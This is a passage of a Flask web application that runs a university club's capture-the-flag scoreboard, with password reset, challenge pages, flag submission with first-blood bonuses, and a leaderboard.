              <div class="sect"><h2>Invalid Link</h2></div>
              <p class="muted">This reset link is invalid or has already been used.</p>
              <p style="text-align:center"><a class="link" href="{{ url_for('forgot_password') }}">Request a new one</a></p>
            </div>""", title="Reset Password — CCSIT CTF", nav="")
    created = datetime.datetime.fromisoformat(reset["created"])
    if (datetime.datetime.now() - created).total_seconds() > 3600:
        return render(HERO + """
            <div class="card reveal" style="max-width:460px;margin:0 auto">
              <div class="sect"><h2>Link Expired</h2></div>
              <p class="muted">This reset link has expired (1 hour limit).</p>
              <p style="text-align:center"><a class="link" href="{{ url_for('forgot_password') }}">Request a new one</a></p>
            </div>""", title="Reset Password — CCSIT CTF", nav="")
    err = ""
    if request.method == "POST":
        p = request.form.get("password") or ""
        p2 = request.form.get("password2") or ""
        if not p:
            err = "Password is required."
        elif p != p2:
            err = "Passwords don't match."
        else:
            pw_errs = check_password_policy(p)
            if pw_errs:
                err = "Password needs: " + ", ".join(pw_errs) + "."
            else:
                qexec("UPDATE users SET pw_hash=? WHERE id=?",
                      (generate_password_hash(p), reset["user_id"]))
                qexec("UPDATE password_resets SET used=1 WHERE id=?", (reset["id"],))
                db().commit()
                return render(HERO + """
                    <div class="card reveal" style="max-width:460px;margin:0 auto">
                      <div class="sect"><h2>Password Reset</h2></div>
                      <p style="color:var(--green);text-align:center">Your password has been updated successfully!</p>
                      <p style="text-align:center"><a class="btn" href="{{ url_for('login') }}" style="display:inline-block;text-decoration:none">Login Now</a></p>
                    </div>""", title="Password Reset — CCSIT CTF", nav="")
    return render(HERO + r"""
        <div class="card reveal" style="max-width:460px;margin:0 auto">
          <div class="sect"><h2>Set New Password</h2></div>
          <p class="muted" style="margin-top:0">Resetting password for <b>{{ email }}</b></p>
          {% if err %}<p class="err">{{ err }}</p>{% endif %}
          <form method="post">
            <label>New Password</label>
            <input name="password" type="password" id="pw1" autocomplete="new-password" placeholder="Min 8 chars, mixed case + digit" required>
            <div class="pw-meter">
              <div class="pw-bar"><span id="pwbar"></span></div>
              <span class="pw-label" id="pwlabel"></span>
            </div>
            <div class="pw-rules" id="pwrules">
              <div id="r_len" class="no">✗ 8+ characters</div>
              <div id="r_up" class="no">✗ Uppercase letter</div>
              <div id="r_lo" class="no">✗ Lowercase letter</div>
              <div id="r_dig" class="no">✗ Digit</div>
            </div>
            <label>Confirm Password</label>
            <input name="password2" type="password" id="pw2" autocomplete="new-password" placeholder="Re-enter password" required>
            <div id="pw_match" style="font-size:12px;margin:-10px 0 14px"></div>
            <button class="btn" style="width:100%">Reset Password</button>
          </form>
        </div>
        <script>
        (function(){
          var pw=document.getElementById('pw1'),bar=document.getElementById('pwbar'),
              lbl=document.getElementById('pwlabel'),pw2=document.getElementById('pw2'),
              mtch=document.getElementById('pw_match');
          var rules={len:document.getElementById('r_len'),up:document.getElementById('r_up'),
                     lo:document.getElementById('r_lo'),dig:document.getElementById('r_dig')};
          function check(v){
            var s=0,c={len:v.length>=8,up:/[A-Z]/.test(v),lo:/[a-z]/.test(v),dig:/[0-9]/.test(v)};
            for(var k in c){
              var txt=rules[k].textContent.slice(2);
              if(c[k]){s++;rules[k].className='ok';rules[k].textContent='✓ '+txt}
              else{rules[k].className='no';rules[k].textContent='✗ '+txt}
            }
            if(v.length>=12&&s>=4)s=5;
            var pct=[0,20,40,60,80,100][s],
                colors=['var(--red)','var(--red)','#f97316','var(--gold)','var(--green)','var(--green)'],
                labels=['','Weak','Fair','Good','Strong','Very Strong'];
            bar.style.width=pct+'%';bar.style.background=colors[s];
            lbl.textContent=labels[s];lbl.style.color=colors[s];
          }
          pw.addEventListener('input',function(){check(this.value)});
          function matchCheck(){
            if(!pw2.value){mtch.textContent='';return}
            if(pw.value===pw2.value){mtch.style.color='var(--green)';mtch.textContent='✓ Passwords match'}
            else{mtch.style.color='var(--red)';mtch.textContent='✗ Passwords don\'t match'}
          }
          pw2.addEventListener('input',matchCheck);
          pw.addEventListener('input',matchCheck);
        })();
        </script>
        """, err=err, email=reset["email"], title="Reset Password — CCSIT CTF", nav="")


# ---------------------------------------------------------------------------
@app.route("/")
@login_required
def index():
    solved = my_solves()
    players = qexec("SELECT COUNT(*) AS c FROM users", fetchone=True)["c"]
    total_solves = qexec("SELECT COUNT(*) AS c FROM solves", fetchone=True)["c"]
    order = qexec("""
        SELECT u.id FROM users u LEFT JOIN solves s ON s.user_id=u.id
        GROUP BY u.id ORDER BY COALESCE(SUM(s.points),0) DESC, MAX(s.ts) ASC""", fetchall=True)
    rank = next((i + 1 for i, r in enumerate(order) if r["id"] == session["uid"]), "-")
    pct = int(100 * len(solved) / len(CHALLENGES)) if CHALLENGES else 0
    return render("""
        <div class="welcome reveal">
          <div>
            <div class="muted" style="font-size:13px">Welcome back,</div>
            <div class="wname">{{ user['display_name'] }}</div>
          </div>
          <div class="prog">
            <div class="prow"><span>Progress</span><span class="mono">{{ pct }}%</span></div>
            <div class="bar"><span style="width:{{ pct }}%"></span></div>
          </div>
          <div class="rank"><span class="muted">Rank</span><b>#{{ rank }}</b><span class="muted">of {{ players }}</span></div>
        </div>
        <div class="stats reveal">
          <div class="s"><span class="ico">🎯</span><div class="n" data-count="{{ nchal }}">0</div><div class="l">Challenges</div></div>
          <div class="s"><span class="ico">⚡</span><div class="n" data-count="{{ score }}">0</div><div class="l">Your Points</div></div>
          <div class="s"><span class="ico">🏆</span><div class="n" data-count="{{ solved|length }}/{{ nchal }}">0</div><div class="l">Solved</div></div>
          <div class="s"><span class="ico">👥</span><div class="n" data-count="{{ players }}">0</div><div class="l">Players</div></div>
        </div>
        <div class="sect reveal"><h2>Challenges</h2></div>
        <div class="clist">
          {% for c in chals %}
          <a class="crow reveal" href="{{ url_for('challenge', cid=c['id']) }}" style="transition-delay:{{ loop.index0 * 80 }}ms">
            <div class="main">
              <div class="cat">{{ c['category'] }}</div>
              <h3>{{ c['name'] }}
                {% if c['id'] in solved %}<span class="solved-badge">✓ Solved</span>{% endif %}
              </h3>
              <div class="d">{{ c['desc'] }}</div>
            </div>
            <div class="meta">
              <div class="diff diff-{{ c['difficulty'] }}">{{ c['difficulty'] }}</div>
              <div class="pts">{{ c['points'] }} pts</div>
            </div>
          </a>
          {% endfor %}
        </div>
        """, chals=CHALLENGES, solved=solved,
        nchal=len(CHALLENGES), players=players, rank=rank, pct=pct,
        title="Challenges — CCSIT CTF", nav="home")


@app.route("/challenge/<cid>")
@login_required
def challenge(cid):
    c = CH_BY_ID.get(cid)
    if not c:
        abort(404)
    solved = cid in my_solves()
    solvers = qexec("SELECT COUNT(*) AS c FROM solves WHERE challenge=?", (cid,), fetchone=True)["c"]
    first_solver = qexec("""
        SELECT u.display_name FROM solves s JOIN users u ON u.id=s.user_id
        WHERE s.challenge=? ORDER BY s.ts ASC LIMIT 1""", (cid,), fetchone=True)
    first_name = first_solver["display_name"] if first_solver else None
    return render("""
        <a href="{{ url_for('index') }}" class="muted" style="font-size:13px;display:inline-flex;align-items:center;gap:6px">
          <span style="font-size:18px">←</span> All challenges
        </a>
        <div class="card reveal" style="margin-top:14px">
          <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:16px">
            <div>
              <div style="font-family:var(--mono);font-size:11px;color:var(--green);letter-spacing:1.5px;text-transform:uppercase;font-weight:600">{{ c['category'] }}</div>
              <h2 style="font-size:28px;margin:4px 0">{{ c['name'] }}</h2>
            </div>
            <div style="display:flex;gap:10px;align-items:center">
              <span class="diff diff-{{ c['difficulty'] }}">{{ c['difficulty'] }}</span>
              <span class="mono" style="color:var(--green);font-weight:700;font-size:22px">{{ c['points'] }} pts</span>
            </div>
          </div>
          <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
            <span class="tag">👥 {{ solvers }} solver{{ 's' if solvers != 1 }}</span>
            {% if first_name %}<span class="tag" style="border-color:rgba(234,179,8,.3);color:var(--gold)">🏅 First blood: {{ first_name }}</span>{% endif %}
          </div>
          <p class="muted" style="margin-bottom:0;line-height:1.7">{{ c['desc'] }}</p>
          {% if solved %}<div class="win" style="display:block;margin-top:16px;font-weight:600">✓ You already solved this challenge!</div>{% endif %}

          <ol class="steps">
            {% if c['id'] == 'corporateleak' %}
            <li><div><b>Open the corporate portal</b><span>The target is a company's internal portal. Register and explore what's available.</span></div></li>
            <li><div><b>Investigate the access model</b><span>Why are some users treated differently? Look at the page carefully for clues.</span></div></li>
            <li><div><b>Gain insider access</b><span>Find a way to access the restricted financial reports and extract the company's annual profit.</span></div></li>
            {% elif c['category'] == 'Crypto' %}
            <li><div><b>Read the ciphertext</b><span>Open the challenge and examine the encoded data.</span></div></li>
            <li><div><b>Identify the encoding</b><span>Figure out which encoding methods were used (Base64, Hex, ROT13, etc.).</span></div></li>
            <li><div><b>Decode layer by layer</b><span>Reverse each encoding step to reveal the hidden flag.</span></div></li>
            {% elif c['category'] == 'Digital Forensics' %}
            <li><div><b>Examine the evidence</b><span>Open the challenge and study the captured data carefully.</span></div></li>
            <li><div><b>Follow the trail</b><span>Look for anomalies, suspicious patterns, and hidden data in the evidence.</span></div></li>
            <li><div><b>Extract the secret</b><span>Decode or extract the hidden information to find the flag.</span></div></li>
            {% elif c['category'] == 'Incident Response' %}
            <li><div><b>Review the logs</b><span>Open the challenge and study the server logs timeline.</span></div></li>
            <li><div><b>Trace the attack</b><span>Follow the attacker's steps — how did they get in? What did they do?</span></div></li>
            <li><div><b>Decode the payload</b><span>Find and decode the attacker's hidden payload to extract the flag.</span></div></li>
            {% else %}
            <li><div><b>Open the target</b><span>The challenge runs on its own server. Click the link below to open it.</span></div></li>
            <li><div><b>Find the vulnerability</b><span>Proxy your browser through Burp Suite and analyze what the page sends.</span></div></li>
            <li><div><b>Capture the flag</b><span>Exploit the vulnerability to get the flag, then submit it below.</span></div></li>
            {% endif %}
          </ol>

          <div class="urlbox">
            <div class="l">Challenge URL</div>
            <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-top:8px">
              <a class="btn" href="{{ cur }}" target="_blank" rel="noopener">Open Challenge ↗</a>
              <code class="mono" id="curl" style="font-size:13px;color:var(--green);word-break:break-all;flex:1;min-width:200px">{{ cur }}</code>
              <button class="copy-btn" id="copybtn" onclick="copyUrl()">Copy URL</button>
            </div>
            <script>
              (function(){document.getElementById('curl').textContent=new URL('{{ cur }}',location.href).href})();
              function copyUrl(){
                var t=document.getElementById('curl').textContent,b=document.getElementById('copybtn');
                navigator.clipboard.writeText(t).then(function(){b.textContent='Copied!';b.classList.add('copied');setTimeout(function(){b.textContent='Copy URL';b.classList.remove('copied')},2000)});
              }
            </script>
          </div>

          <button class="btn ghost sm" id="hintbtn" type="button">💡 Show Hint</button>
          <div id="hint" style="display:none;margin-top:12px;font-size:13px;padding:14px 18px;background:rgba(234,179,8,.06);border:1px solid rgba(234,179,8,.15);border-radius:10px;transition:all .3s">
            <strong style="color:var(--gold)">Hint:</strong> <span class="muted">{{ c['hint'] }}</span>
          </div>

          <hr style="border:0;border-top:1px solid var(--border);margin:24px 0">
          {% if c['id'] == 'corporateleak' %}
          <div class="sect" style="margin-bottom:12px"><h2 style="font-size:16px">💰 Breach the Company</h2></div>
          <p class="muted" style="font-size:13px;margin-bottom:14px">You hacked into the portal. Now prove it — how much did the company profit last year?</p>
          <form id="sform" style="display:flex;gap:12px;flex-wrap:wrap">
            <input id="flag" placeholder="$X,XXX,XXX" autocomplete="off" style="flex:1;min-width:220px;margin:0;font-family:var(--mono)">
            <button class="btn" type="submit" id="sbtn">Submit Amount</button>
          </form>
          {% else %}
          <div class="sect" style="margin-bottom:12px"><h2 style="font-size:16px">Submit Flag</h2></div>
          <form id="sform" style="display:flex;gap:12px;flex-wrap:wrap">
            <input id="flag" placeholder="FLAG{...}" autocomplete="off" style="flex:1;min-width:220px;margin:0;font-family:var(--mono)">
            <button class="btn" type="submit" id="sbtn">Submit</button>
          </form>
          {% endif %}
          <div id="sout"></div>
        </div>
        <canvas id="confetti"></canvas>
        <script>
          const cid={{ c['id']|tojson }};
          document.getElementById('hintbtn').onclick=function(){
            var h=document.getElementById('hint'),b=this;
            if(h.style.display==='none'){h.style.display='block';b.textContent='Hide Hint'}
            else{h.style.display='none';b.textContent='💡 Show Hint'}
          };

          // confetti
          function fireConfetti(){
            var cv=document.getElementById('confetti'),cx=cv.getContext('2d');
            cv.width=window.innerWidth;cv.height=window.innerHeight;
            var particles=[],colors=['#22c55e','#86efac','#eab308','#fde68a','#ffffff','#16a34a'];
            for(var i=0;i<150;i++){
              particles.push({x:cv.width/2,y:cv.height/2,
                vx:(Math.random()-.5)*16,vy:Math.random()*-14-4,
                w:Math.random()*8+4,h:Math.random()*6+3,
                color:colors[Math.floor(Math.random()*colors.length)],
                rot:Math.random()*360,rv:(Math.random()-.5)*12,
                life:1,decay:Math.random()*.015+.008});
            }
            function draw(){
              cx.clearRect(0,0,cv.width,cv.height);var alive=false;
              particles.forEach(function(p){
                if(p.life<=0)return;alive=true;
                p.x+=p.vx;p.y+=p.vy;p.vy+=.3;p.vx*=.99;
                p.rot+=p.rv;p.life-=p.decay;
                cx.save();cx.translate(p.x,p.y);cx.rotate(p.rot*Math.PI/180);
                cx.globalAlpha=p.life;cx.fillStyle=p.color;
                cx.fillRect(-p.w/2,-p.h/2,p.w,p.h);cx.restore();
              });
              if(alive)requestAnimationFrame(draw);
              else cx.clearRect(0,0,cv.width,cv.height);
            }
            draw();
          }

          const sout=document.getElementById('sout'),sbtn=document.getElementById('sbtn');
          document.getElementById('sform').onsubmit=async(e)=>{
            e.preventDefault();sout.className='';sout.style.display='none';sout.textContent='';
            sbtn.disabled=true;sbtn.textContent='Checking...';
            const r=await fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},
              body:JSON.stringify({cid:cid,flag:document.getElementById('flag').value})});
            const d=await r.json();
            sbtn.disabled=false;sbtn.textContent='Submit';
            sout.className=d.correct?'win':'bad';sout.style.display='block';
            sout.textContent=d.message;
            if(d.correct){
              fireConfetti();
              if(d.first_blood){
                sout.innerHTML='<span style="font-size:24px">🩸</span> '+d.message+' <span style="font-size:24px">🩸</span>';
                sout.style.background='linear-gradient(135deg,rgba(239,68,68,.15),rgba(234,179,8,.15))';
                sout.style.borderColor='var(--red)';
                fireConfetti();setTimeout(fireConfetti,500);setTimeout(fireConfetti,1000);
              }
              setTimeout(()=>location.reload(),2500)
            }
          };
        </script>
        """, c=c, cur=chal_url(c), solved=solved, solvers=solvers,
        first_name=first_name,
        title=c["name"] + " — CCSIT CTF", nav="home")


@app.route("/submit", methods=["POST"])
@login_required
def submit():
    data = request.get_json(silent=True) or {}
    c = CH_BY_ID.get(data.get("cid"))
    if not c:
        return jsonify(correct=False, message="Unknown challenge.")
    if (data.get("flag") or "").strip() != c["flag"]:
        return jsonify(correct=False, message="Incorrect flag. Try again.")
    if qexec("SELECT 1 FROM solves WHERE user_id=? AND challenge=?",
              (session["uid"], c["id"]), fetchone=True):
        return jsonify(correct=True, message="Correct — already solved!")
    first_blood = not qexec("SELECT 1 FROM solves WHERE challenge=?", (c["id"],), fetchone=True)
    FIRST_BLOOD_BONUS = 50
    pts = c["points"] + (FIRST_BLOOD_BONUS if first_blood else 0)
    qexec("INSERT INTO solves (user_id,challenge,points,ts) VALUES (?,?,?,?)",
          (session["uid"], c["id"], pts,
           datetime.datetime.now().isoformat(timespec="seconds")))
    db().commit()
    if first_blood:
        return jsonify(correct=True, first_blood=True,
                       message=f"FIRST BLOOD! +{c['points']} + {FIRST_BLOOD_BONUS} bonus = {pts} points!")
    return jsonify(correct=True, message=f"Correct! +{pts} points")


@app.route("/leaderboard")
def leaderboard():
    rows = qexec("""
        SELECT u.display_name, COALESCE(SUM(s.points),0) AS score, MAX(s.ts) AS last_solve
        FROM users u LEFT JOIN solves s ON s.user_id=u.id
        GROUP BY u.id ORDER BY score DESC, last_solve ASC""", fetchall=True)
    fb_rows = qexec("""
        SELECT s.user_id, COUNT(*) AS fb_count FROM solves s
        INNER JOIN (SELECT challenge, MIN(ts) AS first_ts FROM solves GROUP BY challenge) f
        ON s.challenge=f.challenge AND s.ts=f.first_ts
        GROUP BY s.user_id""", fetchall=True)
    fb_by_name = {}
    for fb in fb_rows:
        u = qexec("SELECT display_name FROM users WHERE id=?", (fb["user_id"],), fetchone=True)
        if u:
            fb_by_name[u["display_name"]] = fb["fb_count"]
    top3 = [r for r in rows[:3] if r["score"] > 0]
    return render("""
        <div class="sect reveal"><h2>Leaderboard</h2></div>

        {% if top3|length >= 1 %}
        <div class="lb-podium reveal">
          {% if top3|length >= 2 %}
          <div class="podium-card second">
            <div class="podium-medal">🥈</div>
            <div class="podium-name">{{ top3[1]['display_name'] }}</div>
            <div class="podium-score">{{ top3[1]['score'] }}</div>
            {% if fb.get(top3[1]['display_name'],0) > 0 %}<div style="color:var(--red);font-size:12px;margin-top:4px">🩸 {{ fb[top3[1]['display_name']] }} First Blood{{ 's' if fb[top3[1]['display_name']] > 1 }}</div>{% endif %}
            <div class="podium-label">2nd Place</div>
          </div>
          {% endif %}
          <div class="podium-card first">
            <div class="podium-medal">🥇</div>
            <div class="podium-name">{{ top3[0]['display_name'] }}</div>
            <div class="podium-score">{{ top3[0]['score'] }}</div>
            {% if fb.get(top3[0]['display_name'],0) > 0 %}<div style="color:var(--red);font-size:12px;margin-top:4px">🩸 {{ fb[top3[0]['display_name']] }} First Blood{{ 's' if fb[top3[0]['display_name']] > 1 }}</div>{% endif %}
            <div class="podium-label">1st Place</div>
          </div>
          {% if top3|length >= 3 %}
          <div class="podium-card third">
            <div class="podium-medal">🥉</div>
            <div class="podium-name">{{ top3[2]['display_name'] }}</div>
            <div class="podium-score">{{ top3[2]['score'] }}</div>
            {% if fb.get(top3[2]['display_name'],0) > 0 %}<div style="color:var(--red);font-size:12px;margin-top:4px">🩸 {{ fb[top3[2]['display_name']] }} First Blood{{ 's' if fb[top3[2]['display_name']] > 1 }}</div>{% endif %}
            <div class="podium-label">3rd Place</div>
          </div>
          {% endif %}
        </div>
        {% endif %}

        <div class="card reveal" style="padding:4px 0;overflow-x:auto">
          <table>
            <thead><tr>
              <th style="width:70px">Rank</th>
              <th>Player</th>
              <th style="width:100px">Points</th>
              <th style="width:90px">🩸 First Blood</th>
              <th>Last Solve</th>
            </tr></thead>
            <tbody>
            {% for r in rows %}
              {% set cls = [] %}
              {% if loop.index==1 and r['score']>0 %}{% set _ = cls.append('gold') %}{% endif %}
              {% if loop.index==2 and r['score']>0 %}{% set _ = cls.append('silver') %}{% endif %}
              {% if loop.index==3 and r['score']>0 %}{% set _ = cls.append('bronze') %}{% endif %}
              {% if user and r['display_name']==user['display_name'] %}{% set _ = cls.append('me') %}{% endif %}
              <tr class="{{ cls|join(' ') }}">
                <td class="rkn">
                  {% if loop.index==1 and r['score']>0 %}🥇{% elif loop.index==2 and r['score']>0 %}🥈{% elif loop.index==3 and r['score']>0 %}🥉{% else %}{{ loop.index }}{% endif %}
                </td>
                <td style="font-weight:600">
                  {{ r['display_name'] }}
                  {% if user and r['display_name']==user['display_name'] %} <span class="tag" style="font-size:10px;padding:2px 8px;border-color:var(--green);color:var(--green)">you</span>{% endif %}
                </td>
                <td class="mono" style="color:var(--green);font-weight:700;font-size:16px">{{ r['score'] }}</td>
                <td style="text-align:center">
                  {% if fb.get(r['display_name'],0) > 0 %}
                    <span style="color:var(--red);font-weight:700">{{ fb[r['display_name']] }}</span>
                  {% else %}
                    <span class="muted">—</span>
                  {% endif %}
                </td>
                <td>
                  {% if r['last_solve'] %}
                    <span class="time-ago" data-time="{{ r['last_solve'] }}">{{ r['last_solve'] }}</span>
                  {% else %}
                    <span class="muted">—</span>
                  {% endif %}
                </td>
              </tr>
            {% endfor %}
            </tbody>
          </table>
        </div>

        <script>
        document.querySelectorAll('.time-ago').forEach(function(el){
          var ts=el.getAttribute('data-time');
          if(!ts||ts==='None')return;
          var d=new Date(ts),now=new Date(),diff=Math.floor((now-d)/1000);
          if(diff<0)diff=0;
          var txt;
          if(diff<60)txt='just now';
          else if(diff<3600)txt=Math.floor(diff/60)+'m ago';
          else if(diff<86400)txt=Math.floor(diff/3600)+'h ago';
          else if(diff<604800)txt=Math.floor(diff/86400)+'d ago';
          else txt=d.toLocaleDateString();
          el.textContent=txt;
          el.title=ts;
        });
        </script>
        """, rows=rows, top3=top3, fb=fb_by_name, title="Leaderboard — CCSIT CTF", nav="lb")


# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import socket
    init_db()
    PORT = 5000
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); lan_ip = s.getsockname()[0]; s.close()
    except Exception:
        lan_ip = "0.0.0.0"
    print("\n  CCSIT CTF platform — Cybersecurity Club, King Faisal University")
    print(f"  Local    ->  http://127.0.0.1:{PORT}")
    print(f"  Network  ->  http://{lan_ip}:{PORT}")
    print("  Run the challenge separately:  python challenge_roleup.py  (port 8001)")
    print("  Online: set ROLEUP_URL to the challenge's public link.\n")
    app.run(host="0.0.0.0", port=PORT, debug=False)
